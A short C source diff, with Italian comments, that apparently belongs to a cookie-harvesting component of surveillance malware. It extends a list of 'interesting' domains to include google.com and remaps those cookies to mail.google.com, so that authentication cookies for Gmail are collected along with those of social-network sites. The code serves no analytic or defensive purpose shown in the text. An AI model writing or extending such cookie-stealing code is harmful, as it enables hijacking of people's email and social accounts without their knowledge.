@@ -18,6 +18,11 @@ BOOL IsInterestingDomainW(WCHAR *domain)
 	for (int i=0; i<SOCIAL_ENTRY_COUNT; i++)
 		if (!wcscmp(domain, social_entry[i].domain))
 			return TRUE;
+
+	// Caso particolare per cookie di mail.google.com messi sul dominio principale
+	if (!wcscmp(domain, L"google.com"))
+		return TRUE;
+
 	return FALSE;
 }
 
@@ -115,13 +120,20 @@ BOOL AddCookieW(WCHAR *domain, WCHAR *name, WCHAR *value)
 	return ret_val;
 }
 
-BOOL AddCookieA(char *domain, char *name, char *value)
+BOOL AddCookieA(char *domain_tmp, char *name, char *value)
 {
 	DWORD i;
+	char domain[2048];
 	cookie_list_entry_struct *temp_array = NULL;
 
-	if (!domain || !name || !value)
+	if (!domain_tmp || !name || !value)
 		return FALSE;
+
+	// Workaround per i cookie segnati sul dominio principale
+	if (!_stricmp("google.com", domain_tmp))
+		_snprintf_s(domain, sizeof(domain), _TRUNCATE, "mail.google.com");
+	else
+		_snprintf_s(domain, sizeof(domain), _TRUNCATE, "%s", domain_tmp);
 
 	// I cookie che iniziano con _ sono volatili, cambiano troppo spesso
 	// e non sono indispensabili per l'auth
